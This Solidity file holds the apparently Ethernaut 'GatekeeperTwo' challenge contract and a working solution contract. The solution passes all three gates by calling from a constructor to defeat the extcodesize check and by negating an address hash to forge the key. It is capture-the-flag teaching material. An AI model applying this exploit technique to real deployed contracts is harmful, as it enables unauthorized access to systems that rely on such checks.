// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract HackGatekeeperTwo {
    GatekeeperTwo public gateKeeperTwo = GatekeeperTwo(0xf89EDeF0d1ADD418699e60F37E004D2E2d6D20b8);
    address public anticipated = 0x6304cf6383A1Db0f9bb40b81E7a38b6dec7896a5;
    bytes8 public hashChunk = bytes8(keccak256(abi.encodePacked(anticipated)));
    bytes8 public gateKey = ~hashChunk;
    
    /**
     * @dev Note that constructor is not included in runtime bytecode.
     */
    constructor() public {
        gateKeeperTwo.enter(gateKey);
    }
}